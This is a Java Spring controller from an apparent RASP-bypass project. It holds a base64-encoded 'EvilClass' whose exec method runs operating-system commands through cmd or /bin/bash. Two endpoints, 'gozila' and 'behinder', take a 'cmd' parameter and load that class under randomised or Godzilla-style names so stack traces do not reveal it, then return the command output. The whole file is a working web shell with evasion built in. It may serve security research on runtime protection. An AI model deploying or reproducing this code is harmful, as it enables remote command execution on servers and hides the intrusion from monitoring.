package com.example.raspbypass.controller;

import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.stereotype.Controller;
import org.springframework.util.ResourceUtils;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Method;
import java.util.Random;

import static com.example.raspbypass.Util.Util.LOADER;
import static com.example.raspbypass.Util.Util.base64Decode;

@Controller
@RequestMapping("/bypass2")
public class Bypass2 {
    //使用随机类名混淆堆栈信息。

    private static byte[] EVIL_CLASS_BYTES = base64Decode("yv66vgAAADQAYQoAFwA0CAA1CgA2ADcIADgKAAYAOQcAOggAKQgAOwgAPAgAPQoAPgA/CgA+AEAKAEEAQgcAQwoADgBECABFCgAOAEYKAA4ARwoADgBICABJCABKBwBLBwBMAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACdMY29tL2V4YW1wbGUvcmFzcGJ5cGFzcy9VdGlsL0V2aWxDbGFzczsBAARleGVjAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAdjb21tYW5kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmluAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAHc2Nhbm5lcgEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAANvdXQBABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAA1TdGFja01hcFRhYmxlBwAiBwBNBwBDBwA6AQAKRXhjZXB0aW9ucwcATgEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMABgAGQEAB29zLm5hbWUHAE8MAFAAIAEAA1dpbgwAUQBSAQAQamF2YS9sYW5nL1N0cmluZwEAAi9jAQAJL2Jpbi9iYXNoAQACLWMHAFMMAFQAVQwAHwBWBwBXDABYAFkBABFqYXZhL3V0aWwvU2Nhbm5lcgwAGABaAQACXEEMAFsAXAwAXQBeDABfAGABAAABAAROdWxsAQAlY29tL2V4YW1wbGUvcmFzcGJ5cGFzcy9VdGlsL0V2aWxDbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEACnN0YXJ0c1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwAhABYAFwAAAAAAAgABABgAGQABABoAAAAvAAEAAQAAAAUqtwABsQAAAAIAGwAAAAYAAQAAAAYAHAAAAAwAAQAAAAUAHQAeAAAAAQAfACAAAwAaAAABIQAEAAYAAAB4EgK4AAPGACYSArgAAxIEtgAFmQAZBr0ABlkDEgdTWQQSCFNZBStTTacAFga9AAZZAxIJU1kEEgpTWQUrU00rxgA2AU64AAsstgAMtgANTrsADlkttwAPEhC2ABE6BBkEtgASmQALGQS2ABOnAAUSFDoFGQWwEhWwAAAAAwAbAAAAKgAKAAAACQAVAAoAKwAMAD4ADgBCAA8ARAAQAE8AEQBeABIAcgATAHUAFQAcAAAASAAHACgAAwAhACIAAgBEADEAIwAkAAMAXgAXACUAJgAEAHIAAwAnACgABQAAAHgAHQAeAAAAAAB4ACkAKAABAD4AOgAhACIAAgAqAAAAGQAFK/wAEgcAK/0ALwcALAcALUEHAC75AAQALwAAAAQAAQAwADEAAAAFAQApAAAAAQAyAAAAAgAz");


    @GetMapping("gozila")
    public void gozila(HttpServletRequest request, HttpServletResponse response) {
        try {

            String cmd = request.getParameter("cmd");
            String gozilaClassName = this.GozilaRandomClassName();
            byte[] GozilaClassBytes = dynamicUpdateClassName(gozilaClassName, EVIL_CLASS_BYTES);
            Class evilclass = LOADER.defineClass0(gozilaClassName, GozilaClassBytes, 0, GozilaClassBytes.length, null);
            Object obj = evilclass.newInstance();
            Method method = evilclass.getDeclaredMethod("exec", String.class);
            String content = (String) method.invoke(obj, cmd);
            response.getWriter().write(content);
        } catch (Exception e) {
            try {
                response.getWriter().write(e.toString());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    @GetMapping("/behinder")
    public void behinder(HttpServletRequest request, HttpServletResponse response) {
        try {
            String cmd = request.getParameter("cmd");
            String BehinderClassName = getRandomClassName();
            byte[] BehinderClassBytes = dynamicUpdateClassName(BehinderClassName, EVIL_CLASS_BYTES);
            Class evilclass = LOADER.defineClass0(BehinderClassName, BehinderClassBytes, 0, BehinderClassBytes.length, null);
            Object obj = evilclass.newInstance();
            Method method = evilclass.getDeclaredMethod("exec", String.class);
            String content = (String) method.invoke(obj, cmd);
            response.getWriter().write(content);
        } catch (Exception e) {
            try {
                response.getWriter().write(e.toString());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    public static String getRandomAlpha(int length) {
        String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random random = new Random();
        StringBuffer sb = new StringBuffer();

        for (int i = 0; i < length; ++i) {
            int number = random.nextInt(52);
            sb.append(str.charAt(number));
        }

        return sb.toString();
    }

    public static String getRandomClassName() {
        String[] domainAs = new String[]{"com", "net", "org", "sun"};
        String domainB = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
        String domainC = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
        String domainD = getRandomAlpha((new Random()).nextInt(5) + 3).toLowerCase();
        String className = getRandomAlpha((new Random()).nextInt(7) + 4);
        className = className.substring(0, 1).toUpperCase() + className.substring(1).toLowerCase();
        int domainAIndex = (new Random()).nextInt(4);
        String domainA = domainAs[domainAIndex];
        int randomSegments = (new Random()).nextInt(3) + 3;
        String randomName;
        switch (randomSegments) {
            case 3:
                randomName = domainA + "/" + domainB + "/" + className;
                break;
            case 4:
                randomName = domainA + "/" + domainB + "/" + domainC + "/" + className;
                break;
            case 5:
                randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
                break;
            default:
                randomName = domainA + "/" + domainB + "/" + domainC + "/" + domainD + "/" + className;
        }

        return randomName.replace("/", ".");
    }

    public byte[] dynamicUpdateClassName(String className, byte[] classContent) {
        try {
            CtClass ctClass = ClassPool.getDefault().makeClass(new ByteArrayInputStream(classContent));
            ctClass.setName(className);
            classContent = ctClass.toBytecode();
            ctClass.detach();
            return classContent;
        } catch (Exception var5) {
            return classContent;
        }
    }

    public synchronized String GozilaRandomClassName() throws Exception {
        File file = ResourceUtils.getFile("classpath:assets/classNames.txt");
        InputStream inputStream = new FileInputStream(file);
        String classNameString = new String(readInputStream(inputStream));
        String[] classNames = classNameString.split("\n");
        String className = null;
        if (classNames.length > 0) {
            int index = randomInt(0, classNames.length);
            className = classNames[index];
        }
        return className;
    }

    public static byte[] readInputStream(InputStream inputStream) throws Exception {
        byte[] temp = new byte[5120];
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        int readOneNum;

        while ((readOneNum = inputStream.read(temp)) != -1) {
            bos.write(temp, 0, readOneNum);
        }

        return bos.toByteArray();
    }

    public static int randomInt(int max, int min) {
        return min + (int) (Math.random() * (double) (max - min + 1));
    }


}
